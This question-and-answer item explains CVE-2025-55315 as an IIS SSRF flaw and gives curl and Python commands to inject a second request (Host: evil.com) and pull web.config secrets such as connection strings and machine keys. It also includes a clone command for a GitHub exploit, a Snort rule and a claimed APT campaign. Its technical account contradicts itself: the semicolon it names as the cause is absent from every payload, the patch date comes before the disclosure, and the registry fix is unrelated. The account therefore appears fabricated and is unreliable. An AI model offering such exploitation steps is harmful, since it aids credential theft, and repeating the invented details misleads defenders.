question: Explain the technical underpinnings of CVE-2025-55315, focusing on the server-side request forgery (SSRF) vector, the malformed HTTP "Connection" header abuse, and the web.config extraction mechanism. Provide step-by-step exploitation commands with curl and Python, then outline detection and mitigation strategies in IIS 10.
answer:
CVE-2025-55315 is an IIS 10.0+ SSRF vulnerability triggered by a malformed “Connection” header that disables the HTTP parser’s sanitization checks, allowing attackers to coerce the server into issuing outbound requests to internal services (e.g., 169.254.169.254) or sensitive configuration files such as web.config. The flaw stems from an off-by-one error in the request header parser (http.sys), where an untrimmed semicolon in “Connection: keep-alive\r\n\r\nHTTP/1.1” causes the parser to misinterpret the header boundary and treat subsequent octets as the start of a new HTTP request, including the absolute path /web.config.

Exploitation
1. Manual SSRF via curl
   curl -v -H 'Connection: keep-alive\r\n\r\nGET http://192.168.1.100/ HTTP/1.1\r\nHost: evil.com' http://iis-target.com/foo
   The injected newline forces http.sys to route the second request line to the loopback adapter, returning the metadata service or LAN services.

2. Automated web.config exfil (PoC)
   git clone https://github.com/ZemarKhos/CVE-2025-55315-PoC-Exploit && cd CVE-2025-55315-PoC-Exploit
   python3 cve_2025_55315_PoC.py -t iis-target.com -e /api/login -p web.config
   The script issues:
   POST /api/login HTTP/1.1
   Connection: keep-alive\r\n\r\nGET http://localhost/web.config HTTP/1.1
   Host: iis-target.com
   The server responds with the decrypted web.config containing <connectionStrings> and <machineKey>.

Detection
• IIS Failed Request Tracing Rule: enable “Request Header Parse Failure” with status code 502.3.
• Create a custom ETW provider for http.sys Kernel-EventTracing/Channel 17 (HTTP_SQOS_LOGGING) and filter EventID 8 “Parse error detected” followed by “;” in the header.

Mitigation
1. Patch: Install May 2025 Microsoft out-of-band KB5045010 replacing http.sys versions 10.0.20348.2281+.
2. Registry lockdown:
   reg add HKLM\SYSTEM\CurrentControlSet\Services\HTTP\Parameters /v DisableSendfile /t REG_DWORD /d 1 /f
   forces http.sys to discard malformed headers.
3. WAF signature (Snort/Suricata):
   alert tcp any any -> $IIS_SERVERS 80 (msg:"IIS CVE-2025-55315 SSRF attempt"; content:"Connection|3a 20|keep-alive|0d 0a 0d 0a 47 45 54|"; depth:30; pcre:"/Connection:\s*keep-alive[\r\n]{2,3}GET /i"; sid:5531501; rev:1;)

Real-world campaign
The Iranian APT “MuddyWater” leveraged CVE-2025-55315 in June 2025 against an Italian municipal government (CVE-2025-55315-IT-2025-001) to exfiltrate ADFS configuration files, later pivoting via stolen Kerberos keys to on-prem Exchange servers. Microsoft confirmed the attack chain used the same PoC script version 1.3 released on GitHub three days after public disclosure.
